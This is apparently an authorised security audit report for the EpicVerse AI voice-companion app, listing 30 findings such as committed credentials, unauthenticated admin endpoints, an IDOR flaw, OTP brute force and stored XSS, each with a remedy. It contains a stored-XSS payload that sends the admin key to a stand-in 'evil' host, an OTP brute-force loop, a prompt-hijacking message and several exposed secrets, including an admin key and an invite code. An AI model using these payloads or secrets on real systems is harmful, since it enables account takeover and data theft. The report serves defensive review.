# EpicVerse — Security Findings Report

**Assessment type:** Static source-code review (authorised)
**Date:** 2026-09-10
**Scope:** `backend/` (FastAPI), `frontend/EpicVerseApp/` (Flutter), configuration, IaC, dependencies, cloud integration points
**Method:** Architecture reconstruction → auth/z flow tracing → endpoint mapping → trust-boundary & data-flow analysis → config & dependency review. No dynamic testing, no changes made.

---

## Executive Summary

EpicVerse is an invite-only, AI voice-companion mobile app. A Flutter client talks to a FastAPI service on Cloud Run, which brokers OpenAI (Realtime + Whisper + TTS + embeddings), Google Cloud Speech/TTS/Storage, Firebase Auth, Cloud SQL (Postgres/pgvector) and Redis. Firebase ID tokens are the primary authentication mechanism; Firestore rules are correctly deny-by-default and user-scoped.

**Overall posture: HIGH RISK — not production-ready in its current state.**

The most serious problems are:

1. **Secrets in the repository.** Production **database superuser credentials** and **GCP/Firebase service-account private keys** are committed in `backend/scripts/*.py`. The service-account key alone allows minting valid Firebase tokens for *any* user — a complete authentication bypass for the whole platform.
2. **Unauthenticated admin surface.** `POST /admin/purge-expired-deletions` has no authentication and permanently deletes accounts. The other `/admin/*` routes are gated only by a static string (`kriyora-admin-2026`) passed in the URL query, and expose all user PII.
3. **Broken access control on core flows.** `GET /user/{firebase_id}` is unauthenticated (IDOR); the invite-only gate is enforced only in the client; `/auth/verify-otp` has no brute-force protection and issues a login token on success; MFA / email-verification are cosmetic (never enforced server-side).
4. **Stored XSS in the admin dashboard**, escalating to theft of the admin key.
5. **Resource/financial abuse:** the OpenAI Realtime WebSocket is effectively an authenticated open proxy to OpenAI on the server's API key, with no per-user quota.

Firestore rules, Android OS-level certificate pinning, `allowBackup=false`, ATS on iOS, parameterised SQL, and the production docs hiding of Swagger are done correctly and should be preserved.

---

## Findings Summary

| ID | Vulnerability | Severity | Confidence | Component | CWE / OWASP |
|----|---------------|----------|------------|-----------|-------------|
| F-01 | Production DB superuser credentials committed to repo (+ destructive TRUNCATE script) | Critical | Confirmed | `backend/scripts/` | CWE-798 / A07, API8 |
| F-02 | GCP/Firebase service-account private keys committed to repo | Critical | Confirmed | `backend/scripts/` | CWE-798 / A05, A07 |
| F-03 | Unauthenticated destructive admin endpoint `/admin/purge-expired-deletions` | Critical | Confirmed | `backend/app/api/routes.py` | CWE-306 / API2, API5 |
| F-04 | Static hardcoded admin key in URL query guards all `/admin/*` PII endpoints | Critical | Confirmed | `backend/app/api/routes.py` | CWE-798, CWE-598 / API1, A01 |
| F-05 | IDOR: `GET /user/{firebase_id}` unauthenticated; GET has side effects | High | Confirmed | `backend/app/api/routes.py` | CWE-639, CWE-284 / API1 |
| F-06 | Invite-only registration gate enforced only client-side | High | Confirmed | `backend` + `create_profile_screen.dart` | CWE-602, CWE-284 / A01 |
| F-07 | OTP brute-force → account takeover (`/auth/verify-otp` unthrottled, mints token) | High | High Confidence | `backend/app/api/routes.py`, `user_db.py` | CWE-307, CWE-640 / API4 |
| F-08 | Stored XSS in `/admin/dashboard` (display_name / email / feedback) → admin-key theft | High | Confirmed | `backend/app/api/routes.py` | CWE-79 / A03 |
| F-09 | MFA & email-verification are client-side only; never enforced by backend | High | Confirmed | `login_screen.dart`, `backend` | CWE-287, CWE-306 / A07 |
| F-10 | Realtime WebSocket = authenticated open proxy to OpenAI; no per-user quota | High | High Confidence | `backend/app/services/realtime_service.py`, `routes.py` | CWE-284, CWE-770 / API4 |
| F-11 | `EPIC-DEV-2026` permanent hardcoded master invite code, committed | High | Confirmed | `backend/scripts/generate_invites.py` | CWE-798 / A07 |
| F-12 | CORS `allow_origins=["*"]` + `allow_credentials=True` + `expose_headers=["*"]` | Medium | Confirmed | `backend/app/main.py` | CWE-942 / A05 |
| F-13 | Mass assignment: `/sync-user` trusts client `email` & `mfa_enabled` | Medium | Confirmed | `backend/app/api/routes.py`, `user_db.py` | CWE-915, CWE-639 / API3, API6 |
| F-14 | Sentry `sendDefaultPii = true`, 100% trace sampling | Medium | Confirmed | `frontend/.../main.dart` | CWE-201 / A09 |
| F-15 | Sensitive data written to server logs (OTP, transcripts, DSN, exceptions) | Medium | Confirmed | `backend` (multiple) | CWE-532 / A09 |
| F-16 | Verbose internal errors returned to clients | Medium | Confirmed | `routes.py`, `ai_pipeline.py`, `main.py` | CWE-209 / A05 |
| F-17 | HTML injection into internal notification emails | Medium | Confirmed | `backend/app/services/email_service.py` | CWE-79, CWE-93 |
| F-18 | User / account enumeration (multiple vectors) | Medium | Confirmed | `backend` + `login_screen.dart` | CWE-204, CWE-639 / API1 |
| F-19 | Raw voice audio persisted to GCS; contradicts Privacy Policy / FAQ | Medium | Needs Verification | `backend/app/api/routes.py`, `storage.py` | A09 / privacy |
| F-20 | Docker image runs as root; build tools retained; broad `COPY . .` | Medium | Confirmed | `backend/Dockerfile` | CWE-250, CWE-269 |
| F-21 | `verify_session()` fails open | Medium | Confirmed | `backend/app/services/user_db.py` | CWE-636 |
| F-22 | No size limit on base64 `profile_picture`; returned by unauth endpoint | Medium | Confirmed | `backend` | CWE-770 |
| F-23 | Dart-layer TLS pinning is a no-op; iOS has no pinning | Low | Confirmed | `frontend/.../ssl_pinning_service.dart` | MASVS-NETWORK |
| F-24 | Predictable secret naming (`*-2026`) | Low | Confirmed | repo-wide | CWE-521 |
| F-25 | OTP generated with non-CSPRNG `random` | Low | Confirmed | `backend/app/api/routes.py` | CWE-330, CWE-338 |
| F-26 | In-memory OTP rate limiter: not multi-instance, unbounded growth | Low | Confirmed | `backend/app/api/routes.py` | CWE-770 |
| F-27 | Firebase client API keys committed; Android/Browser keys unrestricted | Low | Confirmed | `frontend/.../google-services.json`, `GoogleService-Info.plist` | CWE-200 |
| F-28 | `debugPrint` of URLs / request data / tokens in Flutter | Low | Confirmed | `frontend` (multiple) | MASVS-STORAGE / CWE-532 |
| F-29 | Dead/misleading code paths (`wake_word.py` hardcoded path; LLM number fallback) | Info | Confirmed | `backend/app/services/` | — |
| F-30 | Stale static-token stress harness (`production_audit.py`) | Info | Needs Verification | `backend/production_audit.py` | — |

---

## Detailed Findings

### F-01 — Production database superuser credentials committed to the repository — **Critical**

- **Component / files:**
  `backend/scripts/clear_user_data.py:5`, `backend/scripts/refresh_invite_codes.py:9` (both git-tracked). `backend/scripts/reset_invite_codes.py` is in the same family — verify.
- **Evidence:**
  ```python
  DATABASE_URL = "postgresql://postgres:Kriyora%40****@34.93.247.219/epicverse-db"
  ```
  User `postgres` (superuser), password `Kriyora@****` (URL-encoded), a public GCP IP, database `epicverse-db`. `clear_user_data.py` then runs `TRUNCATE TABLE chat_history / users / user_otps RESTART IDENTITY CASCADE`.
- **Why it is a risk:** anyone with read access to the repository (or any leak / fork / laptop / CI cache) obtains superuser access to production data, limited only by Cloud SQL's authorised-networks list. The password follows a guessable pattern (`<Company>@<Year>`, cf. F-04, F-11). A committed script to wipe production is a ready-made destructive tool.
- **Attack scenario:** a contractor with repo access, or an attacker who obtains the repo, connects from an allowed IP (or from anywhere if the instance is `0.0.0.0/0`), dumps `users` (emails, display names, invite codes, session IDs) and `chat_history`, or runs the bundled truncation.
- **Remediation:**
  1. Treat the password and the DB as compromised: rotate the `postgres` password now; create a least-privilege application role (no superuser, only DML on the needed tables) and use it for the app.
  2. Remove every hardcoded DSN from source; load from env / Secret Manager only.
  3. Purge from git history (`git filter-repo` / BFG) and force-push; rotate again after the rewrite.
  4. Confirm Cloud SQL authorised networks are not `0.0.0.0/0`; prefer the Cloud SQL Connector / private IP.
  5. Move `clear_user_data.py` out of the repo or guard it behind an explicit, environment-scoped confirmation.

### F-02 — GCP / Firebase service-account private key(s) committed to the repository — **Critical**

- **Component / files:** `backend/scripts/final_sanity.py:4`, `backend/scripts/tmp_fix_creds.py:4`, `backend/scripts/sanitize_creds.py`, `backend/scripts/test_key.py` (all git-tracked; first committed in `c82974a`). `backend/google-credentials.json` itself is *not* tracked and is in `.gitignore`/`.dockerignore` — but the key material was pasted into these helper scripts.
- **Evidence:** full `-----BEGIN PRIVATE KEY----- … -----END PRIVATE KEY-----` blocks embedded as string literals, with `"project_id": "kriyora-epicverse"`, `"client_email": "kriyora-epicverse@kriyora-epicverse.iam.gserviceaccount.com"`, `"private_key_id": "cb5bda06…"`. At least two different key bodies are present across the files (key rotation attempts left both in history).
- **Why it is a risk:** a Firebase Admin service-account key can call `auth.create_custom_token(<any uid>)` and `auth.verify_id_token`, i.e. **impersonate any user of the platform**. The backend (`app/api/dependencies.py`, `routes.py`) trusts Firebase tokens implicitly, so this is a full authentication bypass. Depending on the service account's IAM roles it may also grant Cloud Storage, Cloud SQL, logging and other project access.
- **Attack scenario:** attacker extracts the key from the repo/history, mints a custom token for the victim's uid, signs in via `signInWithCustomToken`, and takes over any account — including whatever account is used for the admin dashboard.
- **Remediation:**
  1. **Disable / delete the exposed key(s) in the Google Cloud console immediately**, then create a fresh key delivered only via Secret Manager or Workload Identity (Cloud Run service identity — no key file at all is best).
  2. Delete the helper scripts; never paste key material into code.
  3. Purge from git history and force-push.
  4. Review the service account's IAM roles and reduce to least privilege.
  5. Check Cloud Audit Logs for use of the exposed `private_key_id` from unexpected callers.

### F-03 — Unauthenticated destructive admin endpoint — **Critical**

- **File / function:** `backend/app/api/routes.py:509` `purge_expired_deletions_route()` (`POST /api/v1/admin/purge-expired-deletions`).
- **Evidence:** the handler takes no `Depends(get_current_user)` and no key check. It calls `purge_expired_deletions()` (`user_db.py:215` — `DELETE FROM chat_history`, `DELETE FROM users`) and then `firebase_admin.auth.delete_user(uid)` for each purged uid.
- **Why it is a risk:** any anonymous caller can invoke the permanent-deletion job. While it only deletes accounts already past the 30-day grace window, it is an unauthenticated call into `firebase_admin.auth.delete_user` and irreversible DB deletes, and it leaks purge results.
- **Attack scenario:** attacker scripts `POST /admin/purge-expired-deletions` on a schedule; any account whose owner scheduled deletion and then changed their mind but has not yet signed back in is destroyed early; the response body enumerates purged uids.
- **Remediation:** require authentication. Use Cloud Scheduler with OIDC and verify the `Authorization` bearer / `X-CloudScheduler` header + audience, or an internal-only network path / secret from Secret Manager. Never rely on obscurity of the path.

### F-04 — Static hardcoded admin key passed in URL query — **Critical**

- **File / functions:** `backend/app/api/routes.py:501` `admin_get_feedback`, `:845` `admin_dashboard_data`, `:852` `admin_dashboard`. Guard: `if key != "kriyora-admin-2026": raise 403`.
- **Evidence:** `@router.get("/admin/dashboard") async def admin_dashboard(key: str = "")` — the secret arrives as `?key=kriyora-admin-2026`. `/admin/dashboard-data` returns every user's `display_name`, `email`, `invite_code`, join date, all feedback with author email, and all pending-deletion records.
- **Why it is a risk:** (a) the value is committed to the repo and guessable (`<company>-admin-<year>`); (b) query-string secrets land in Cloud Run / load-balancer / proxy access logs, browser history, and `Referer` headers; (c) one constant guards a full PII dump with no rotation, no per-user identity, no audit.
- **Attack scenario:** the key is read from the repo, or guessed, or pulled from an access-log export → attacker opens `/api/v1/admin/dashboard-data?key=…` and exfiltrates the entire user base. Compounded by F-08 (the key can be stolen from an admin's browser via stored XSS).
- **Remediation:** delete these endpoints or move them behind real authN/Z — Firebase token + an `admin` custom claim / allow-listed uid, checked server-side. If a machine endpoint is needed, use a Secret Manager value sent in an `Authorization` header (never the query string), plus IP/Cloud Armor restrictions, and log access.

### F-05 — IDOR / Broken Object Level Authorization on `GET /user/{firebase_id}` — **High**

- **File / function:** `backend/app/api/routes.py:290` `fetch_user()`.
- **Evidence:**
  ```python
  @router.get("/user/{firebase_id}")
  async def fetch_user(firebase_id: str):
      user = await get_user(firebase_id)
      ...
  ```
  No `Depends(get_current_user)`, no ownership check. `get_user()` (`user_db.py:102`) returns `SELECT * FROM users` (email, display_name, invite_code, session_id, mfa_enabled, email_verified, deletion_requested_at, profile_picture …). It *also* mutates state: if `deletion_requested_at` is set it clears it ("auto-cancel deletion").
- **Why it is a risk:** Firebase uids are not secrets (they appear in logs, tokens, client traffic). Anyone can read any user record, and a plain unauthenticated GET **cancels a victim's pending account deletion**.
- **Attack scenario:** attacker who has seen a target uid (or brute-forces the 28-char space opportunistically) pulls the full profile; or repeatedly GETs to keep resurrecting an account the user is trying to delete.
- **Remediation:** add `Depends(get_current_user)`; return only when `current_user["uid"] == firebase_id` (or an admin claim). Move the auto-cancel behaviour to an explicit authenticated `POST` (the `cancel-deletion` route already exists). Return a whitelisted field set, not `SELECT *`.

### F-06 — Invite-only registration enforced only in the client — **High**

- **Files:** `frontend/.../create_profile_screen.dart` (`_submitForm` → `createUserWithEmailAndPassword` → `/sync-user`), `backend/app/api/routes.py:52` `sync_user()`.
- **Evidence:** `sync_user()` checks the caller's token and `uid == user.get_uid()`, then `save_user(user)` and `if user.invite_code: mark_invite_code_used(...)`. **There is no `validate_invite_code()` call.** Invite validation happens only in Flutter and via the unauthenticated `GET /validate-invite/{code}`. Firebase email/password signup (`firebase.json` → `emailPassword: true`) is open to anyone holding the app's API key (committed — F-27), and no Firebase App Check is configured in the code.
- **Why it is a risk:** the invite code is the platform's primary access-control gate (per `SECURITY.md`). An attacker who calls Firebase Auth directly creates an account with no invite, obtains a valid ID token, then calls `/sync-user` with any/no `invite_code`. They are now a full user and can reach `/process-audio`, `/ws/realtime` (OpenAI cost — F-10), `/feedback`, etc.
- **Attack scenario:** `curl` the Firebase `signUp` REST endpoint with the public API key → `idToken` → `POST /sync-user {firebase_id, email}` → done, no invite consumed.
- **Remediation:** enforce invites server-side. In `sync_user`, require a still-valid `invite_code`, `validate_invite_code()` it, and consume it atomically (single transaction, `UPDATE … WHERE current_uses < max_uses RETURNING`). Better: block open Firebase signup — mint accounts only from a backend endpoint that first validates the invite, or require Firebase App Check + a server-set custom claim before any data endpoint works. Reject `/process-audio` and `/ws/realtime` for users with no DB row / no consumed invite.

### F-07 — OTP brute-force → account takeover — **High**

- **Files:** `backend/app/api/routes.py:139` `verify_otp_route`, `:226` `send_email_otp_preregistration`, `backend/app/services/user_db.py:260` `verify_otp`.
- **Evidence:**
  - `POST /auth/verify-otp` has **no rate limiting and no attempt counter** (unlike `/auth/send-otp`, which calls `_otp_allowed`). On success it calls `fb_auth.create_custom_token(uid)` and returns `custom_token` → the caller can `signInWithCustomToken`.
  - `verify_otp` only checks `otp = $2 AND created_at > NOW() - INTERVAL '1 minute'`. The OTP is a 6-digit number (`random.randint(100000, 999999)`, F-25).
  - `POST /auth/send-email-otp` is fully open (no invite, no token) and writes an OTP row for any email.
- **Why it is a risk:** an attacker triggers an OTP for a victim's email, then floods `/auth/verify-otp` with `otp` guesses. 10⁶ keyspace, 60-second window, no lockout, no IP throttle — partial coverage each cycle, repeatable. A hit yields a Firebase custom token for the victim = account takeover. `random` (Mersenne Twister) further weakens unpredictability.
- **Attack scenario:** `for otp in 000000..999999: POST /auth/verify-otp identifier=victim@x.com otp=$otp` in parallel; on 200, take `custom_token`, sign in as the victim.
- **Remediation:** per-identifier + per-IP rate limit and a hard attempt lockout (e.g. 5 tries, then invalidate the OTP and cool down) backed by Redis/DB (not in-memory — F-26). Generate OTPs with `secrets.randbelow`. Consider 8 digits and a shorter, single-use guarantee. Do not return `custom_token` from an endpoint that isn't itself strongly rate-limited; prefer re-using Firebase's own email-link / MFA primitives.

### F-08 — Stored XSS in the admin dashboard → admin-key theft — **High**

- **File / function:** `backend/app/api/routes.py:852` `admin_dashboard` (inline `<script>`), rendering data from `/admin/dashboard-data`.
- **Evidence:** the client-side JS builds table rows with template literals and assigns to `innerHTML` without escaping:
  ```js
  ub.innerHTML = d.users.map((u,i) => `<tr> ... <td>${u.display_name || '—'}</td> <td>${u.email || '—'}</td> ...`).join('');
  fb.innerHTML = d.feedback.map((f,i) => `<tr> ... <td class="msg">${f.message}</td> ...`).join('');
  ```
  `display_name` is fully attacker-controlled via `/sync-user` (no sanitisation anywhere); `message` via `POST /feedback`; `email` via `/sync-user` (F-13).
- **Why it is a risk:** when the owner opens `/api/v1/admin/dashboard?key=kriyora-admin-2026`, injected markup runs in that page. `location.search` contains the admin key, so a payload like `<img src=x onerror="fetch('https://evil/?k='+encodeURIComponent(location.search))">` exfiltrates the admin key (F-04), which unlocks the entire user database.
- **Attack scenario:** register (F-06) with `display_name` set to the payload; wait for the owner to load the dashboard; receive the admin key; dump all users.
- **Remediation:** stop building HTML by string concatenation — set values via `textContent` / `createElement`, or a templating library with contextual auto-escaping; add a strict `Content-Security-Policy` on the dashboard response (`default-src 'none'; script-src 'self'`); server-side length/character validation on `display_name` and feedback; and fix F-04 so a leaked dashboard page isn't catastrophic.

### F-09 — MFA and email verification are client-side only — **High**

- **Files:** `frontend/.../login_screen.dart` `_handleLogin`, `backend` data endpoints.
- **Evidence:** `signInWithEmailAndPassword` returns a fully valid ID token *before* any OTP step. The "MFA interception" and "email_verified" checks are UI navigation decisions based on `res.data['mfa_enabled']` / `res.data['email_verified']`. No backend endpoint (`/process-audio`, `/ws/realtime`, `/user/update-mfa`, `/feedback`, …) checks `mfa_enabled` or `email_verified`. `/user/update-mfa` sets the flag with no re-authentication.
- **Why it is a risk:** an attacker with the victim's email+password (or the F-02 key, or an F-07 token) simply doesn't run the client OTP flow — the token already works everywhere. MFA provides no actual second factor. A stolen token can also disable the victim's MFA flag silently.
- **Attack scenario:** phished password → talk to Firebase / backend directly with the ID token → full access regardless of the MFA toggle.
- **Remediation:** enforce server-side. Options: use Firebase Multi-Factor Auth (TOTP/SMS) so the ID token itself carries the `second_factor` claim; or gate sensitive endpoints on a backend-issued short-lived "step-up" claim that is only granted after server-side OTP verification; set a custom claim `email_verified` and check it in `get_current_user`. Require recent re-auth for `/user/update-mfa` and account-deletion.

### F-10 — Realtime WebSocket is an authenticated open proxy to OpenAI — **High**

- **Files:** `backend/app/api/routes.py:309` `websocket_realtime`, `backend/app/services/realtime_service.py` (`_relay_from_client` → `await self.openai_ws.send(message["text"])`, line ~936).
- **Evidence:** after a valid Firebase token check, the server opens a WebSocket to `wss://api.openai.com/v1/realtime` with `Authorization: Bearer <OPENAI_API_KEY>` and **forwards arbitrary client text frames straight through** (only a few control types are intercepted). There is no per-user concurrency cap beyond "one session per uid", no turn/token budget, no message-size or rate limit on `input_audio_buffer.append`.
- **Why it is a risk:** any registered user (and per F-06, registration is free) can send `session.update` to replace the system prompt and tools, then `response.create` to run arbitrary, unrelated, long conversations on the company's OpenAI account — a free GPT-4o-realtime proxy and a direct billing-abuse / cost-DoS vector. Audio flooding adds bandwidth and STT cost.
- **Attack scenario:** script connects with a valid token, sends `{"type":"session.update","session":{"instructions":"<attacker prompt>","tools":[]}}`, then drives unlimited turns; repeat across many free accounts.
- **Remediation:** do not blindly relay. Whitelist the exact event types the client is allowed to send and drop `session.update`/`tools`/`response.*` overrides (the server already owns session config). Enforce per-user and global quotas: max concurrent sessions, max turns/tokens per hour, max session duration, audio-bytes/sec cap. Add Cloud Armor rate limits on the WS path. Monitor OpenAI spend with alerts.

### F-11 — Permanent hardcoded master invite code — **High**

- **File:** `backend/app/scripts/generate_invites.py:30` — `DELETE FROM invite_codes WHERE code != 'EPIC-DEV-2026'`.
- **Evidence:** every invite refresh preserves `EPIC-DEV-2026`; it is committed and never expires.
- **Why it is a risk:** given the invite gate is the access-control model, a permanent, published, guessable master code (same `*-2026` pattern as F-04) is a standing backdoor into registration.
- **Remediation:** remove the constant; if a break-glass invite is needed, generate a random one per environment, store it in Secret Manager, set an `expires_at`, and rotate it.

### F-12 — Over-permissive CORS — **Medium**

- **File:** `backend/app/main.py:60` — `allow_origins=["*"]`, `allow_credentials=True`, `allow_methods=["*"]`, `allow_headers=["*"]`, `expose_headers=["*"]`.
- **Why it is a risk:** `allow_credentials=True` with a wildcard origin makes Starlette reflect the caller's `Origin` and allow credentials, so any website can make credentialed cross-origin calls. The API is token-in-header (not cookie) today, which limits classic CSRF, but this also exposes all response headers cross-origin (`X-Transcript`, `X-Response-Text`, `X-Detected-Language` from `/process-audio` leak conversation content to any origin) and is a latent risk if any cookie/session is ever added.
- **Remediation:** this is a mobile backend — it needs no browser CORS at all, or an explicit allow-list of first-party web origins. Remove `allow_credentials` unless required; set `expose_headers` to the specific few needed; restrict methods to those used.

### F-13 — Mass assignment / identity spoofing via `/sync-user` — **Medium**

- **Files:** `backend/app/api/routes.py:52`, `backend/app/services/user_db.py:5` (`UserRecord`), `:80` (`save_user`).
- **Evidence:** `UserRecord` accepts client-supplied `email`, `mfa_enabled`, `primary_language`, `profile_picture`, `display_name`. `save_user` does `email = COALESCE(EXCLUDED.email, users.email)` and `mfa_enabled = COALESCE(EXCLUDED.mfa_enabled, ...)`. `sync_user` verifies `uid` but **never checks `user.email` against `current_user["email"]`**.
- **Why it is a risk:** an authenticated user can set their DB `email` to an arbitrary or another person's address (shown in the admin dashboard, used for feedback notification, matched by `mark_email_verified(email)` which does `WHERE LOWER(email)=LOWER($1)` and could flip another row's `email_verified`), and can toggle their own `mfa_enabled`. Data-integrity and a weak spoofing primitive.
- **Remediation:** on `sync_user`, ignore client `email` — take it from the verified token (`current_user["email"]`). Remove `mfa_enabled` from the client-writable model (only `/user/update-mfa` should change it, with step-up auth). Constrain `primary_language` to an enum, `display_name` to a length/charset, `profile_picture` to a size cap (F-22).

### F-14 — Sentry over-collection — **Medium**

- **File:** `frontend/.../main.dart:18` — `options.sendDefaultPii = true; options.tracesSampleRate = 1.0;`
- **Evidence:** combined with `ApiClient`'s error interceptor passing `requestData` / `responseData` into the logging path, and `sendDefaultPii=true` attaching user IP and request context. 100% trace sampling captures every transaction.
- **Why it is a risk:** OTP codes, email addresses, base64 profile images, feedback text and potentially `Authorization: Bearer` headers can be transmitted to a third-party SaaS. Privacy-policy and data-minimisation exposure; increases blast radius if the Sentry org is compromised.
- **Remediation:** set `sendDefaultPii = false`; add `beforeSend` / `beforeBreadcrumb` scrubbers that strip `Authorization`, `otp`, `password`, `identifier`, `profile_picture`, request/response bodies; drop `tracesSampleRate` to ~0.1 or lower in production; confirm Sentry server-side PII scrubbing is on.

### F-15 — Sensitive data in server logs — **Medium**

- **Evidence:**
  - `routes.py:134` — `print(f"[OTP-SMS-LOG] OTP for {identifier}: {otp}")` (plaintext OTP).
  - `ai_pipeline.py:173-178`, `realtime_service.py` `_log(... transcript ...)` — full user utterances and AI responses.
  - `db_pool.py:108-109` — DSN fragments; many `print(f"... {e}")` with exception detail.
  - `storage.py` mock branches print full interaction JSON.
- **Why it is a risk:** Cloud Run stdout goes to Cloud Logging with retention and broad project-level read access; OTPs in logs defeat the second factor for anyone with Logs Viewer; transcripts are user content.
- **Remediation:** remove OTP/secret logging entirely; use structured logging at INFO without message bodies; redact identifiers (hash/truncate); ensure `DEBUG`-level payload logging cannot run in production; set a short log retention and restrict the Logs Viewer role.

### F-16 — Verbose internal errors returned to clients — **Medium**

- **Evidence:** `routes.py:446` `HTTPException(500, f"Pipeline error: {str(e)}")`; `routes.py:380` WS sends `{"message": str(e)}`; `ai_pipeline.py:193` returns `f"Sorry, I encountered an internal error: {str(e)}"`; `main.py:95-108` `/health` returns `f"error: {str(e)}"` for DB/Redis (can include host/DSN detail) with no auth.
- **Remediation:** return generic messages + a correlation id; log details server-side only. Make `/health` return a boolean status with no exception strings (or require auth for the detailed variant).

### F-17 — HTML injection into internal notification emails — **Medium**

- **File:** `backend/app/services/email_service.py:20-34` `send_feedback_notification`.
- **Evidence:** `display_name`, `user_email`, `message` are interpolated into a `text/html` body sent to `tech@kriyora.com`; `display_name` is also placed in the `subject`.
- **Why it is a risk:** a user controls `display_name` and `message`; they can inject arbitrary HTML/links into the operator's inbox (phishing, tracking pixels, spoofed "system" content). SendGrid's JSON API blunts header injection, but body injection is real.
- **Remediation:** HTML-escape all user values before templating, or send `text/plain`; validate `display_name`.

### F-18 — User / account enumeration — **Medium**

- **Evidence:**
  - `routes.py:166-174` — `/auth/verify-otp` returns **404 "Account not found"** vs **400 "Invalid or expired OTP"**, distinguishing registered emails.
  - `login_screen.dart:355` — `_handleForgotPassword` surfaces Firebase `user-not-found` as "No account found with this email." (the careful backend `/auth/send-password-reset` that returns 200 is not used by the app).
  - `routes.py:42` — `/validate-invite/{code}` is unauthenticated and unthrottled: an invite-code oracle.
- **Remediation:** return a uniform response for verify-otp regardless of account existence; use the backend password-reset endpoint (constant response) instead of the client SDK error; rate-limit and (ideally) authenticate `/validate-invite`, or fold invite validation into the registration transaction only.

### F-19 — Voice audio persisted to GCS, contradicting the stated privacy policy — **Medium (Needs Verification)**

- **Files:** `routes.py:405` `await upload_to_gcs(f"inputs/{session_id}.wav", audio_bytes)`; `routes.py:423` `log_interaction(...)` → `logs/interactions/{session_id}.json` with `user_query` + `ai_response`.
- **Evidence vs claim:** FAQ (`routes.py` `_FAQ_ITEMS`) states *"Is my voice data stored? No."*; the Privacy Policy claims encryption + retention limits. `/process-audio` unconditionally writes the raw input WAV and a transcript log to Cloud Storage with no visible lifecycle/TTL.
- **Needs dynamic verification:** GCS bucket IAM (public vs private, uniform bucket-level access), object lifecycle/retention, CMEK, and whether the `inputs/` prefix is ever cleaned. Also whether the realtime path (`/ws/realtime`) stores audio (it appears not to).
- **Remediation:** align behaviour with the policy — either stop storing raw audio, or disclose it and apply a short lifecycle rule (e.g. auto-delete in 24–72h), private ACLs, uniform bucket-level access, and CMEK; scope the service account to that one bucket.

### F-20 — Container hardening — **Medium**

- **File:** `backend/Dockerfile`.
- **Evidence:** no `USER` directive (runs as root/PID 1); `build-essential` kept in the final image; `COPY . .` copies the whole `backend/` tree (audit scripts, `production_audit.py`, `check_ip_db.py`, `*.plist` — note `.dockerignore` does exclude `.env`, `google-credentials.json`, `GoogleService-Info.plist`, `*.xlsx/*.csv/*.log`, which is good).
- **Remediation:** add a non-root `USER`; use a multi-stage build so compilers aren't in the runtime image; tighten `.dockerignore` to an allow-list (`app/`, `requirements.txt`, `data/` only); pin the base image by digest; add a container scan (Trivy/Artifact Registry scanning) to CI.

### F-21 — `verify_session()` fails open — **Medium**

- **File:** `backend/app/services/user_db.py:311-324`.
- **Evidence:** on any exception it `return True`; and `stored is None or stored == session_id` means a user whose `session_id` column was never written passes any check.
- **Impact:** the single-active-session control is best-effort only; a DB blip or a never-synced session defeats "force logout other device". Not a primary auth control, but should fail closed.
- **Remediation:** return `False` on error; treat missing `session_id` as invalid for the check that gates access.

### F-22 — Unbounded `profile_picture` blob — **Medium**

- **Evidence:** the client base64-encodes an image and sends it in `/sync-user`; stored in `users.profile_picture TEXT`; returned by the unauthenticated `GET /user/{firebase_id}` (F-05). No size limit anywhere.
- **Impact:** DB bloat / storage-cost abuse; large unauthenticated responses.
- **Remediation:** cap decoded size (e.g. ≤256 KB), validate it is an image, or store in GCS and keep only a URL; enforce at the API layer.

### F-23 — TLS pinning is partly cosmetic — **Low**

- **File:** `frontend/.../ssl_pinning_service.dart`.
- **Evidence:** `_trustedPins` and `_chainContainsTrustedPin` are defined but never wired into the request path; `_createValidatingHttpClient()` / `createPinnedWebSocketHttpClient()` just return an `HttpClient` whose `badCertificateCallback` returns `false` (i.e. default OS validation only). The pin hash is computed over the whole DER cert, not the SPKI, so it could never match the configured SPKI pins anyway. Android `network_security_config.xml` *does* pin correctly at the OS layer; iOS has no equivalent config.
- **Impact:** Low (OS validation still applies on both platforms; Android is pinned). Main risk is false confidence and no pinning on iOS.
- **Remediation:** either implement real SPKI pinning in Dart (compare SPKI SHA-256 inside `badCertificateCallback`/`SecurityContext`), or delete the dead code and rely on the Android config plus an iOS pinning solution; update the comments to match reality.

### F-24 — Predictable secret naming — **Low**
`kriyora-admin-2026`, `Kriyora@2026`, `EPIC-DEV-2026` all follow `<org><year>`. Even after rotation, use high-entropy random values from a secret manager.

### F-25 — Non-CSPRNG OTP — **Low**
`routes.py:124,249` use `random.randint`. Use `secrets.randbelow(900000)+100000`. (Impact is bounded by the 1-minute TTL, but pair with F-07's lockout.)

### F-26 — In-memory OTP rate limiter — **Low**
`_otp_rate: dict[str,list]` in `routes.py` is per-process (Cloud Run runs many instances, so the real limit is `3 × instances`) and never evicts keys (unbounded growth). Move to Redis with TTL keys.

### F-27 — Committed Firebase client keys / unrestricted keys — **Low**
`frontend/EpicVerseApp/android/app/google-services.json` (`AIzaSyBXqG…Vl4A`) and `backend/GoogleService-Info.plist` (`AIzaSyBZ…DpDpo`) are committed. Per `SECURITY.md`, the Android and Browser keys have **no application restriction**. These are client identifiers (not backend secrets), but unrestricted keys widen abuse of enabled Google APIs and the files shouldn't be in git. Add Android app (package + SHA-1) and API restrictions in the Cloud console; keep the files out of the repo (already in `.gitignore` — see the prior untracking commit).

### F-28 — Flutter debug logging of URLs / request data — **Low**
`websocket_service.dart` logs the full WS URL (`uid`, `mode`, `session_id`, `listening`, `language`), `logger_service.dart` logs `requestData`/`responseData` (incl. OTP form data on failures) via `debugPrint`, which still reaches logcat in release on Android. Gate all non-error logging on `kDebugMode` and never log auth material or request bodies.

### F-29 / F-30 — Informational
`wake_word.py` hardcodes `e:\kriyora\EpicVerse\...` (Windows path — dead in the container). `_normalize_number_async` sends unrecognised tokens to `gpt-4o-mini` (bounded `max_tokens=10`, minor cost path). `production_audit.py` uses `TEST_TOKEN = "epic-stress-test-token"` against `ws://localhost` — confirm no environment ever accepted static tokens on `/ws/realtime`.

---

## Needs Dynamic Verification

Test only against an authorised dev/staging environment.

1. **Cloud SQL exposure (F-01):** is `34.93.247.219` a public IP with `authorized networks` broader than intended (esp. `0.0.0.0/0`)? Attempt a connection with the committed DSN from an external host.
2. **Service-account blast radius (F-02):** enumerate IAM roles bound to `kriyora-epicverse@…iam.gserviceaccount.com`; check Cloud Audit Logs for use of `private_key_id cb5bda06…` from unknown IPs; confirm the key is disabled after rotation.
3. **Cloud Run auth (F-03/F-05):** confirm the service allows unauthenticated invocations (expected) so these endpoints are internet-reachable; test `POST /admin/purge-expired-deletions` and `GET /api/v1/user/<uid>` with no token.
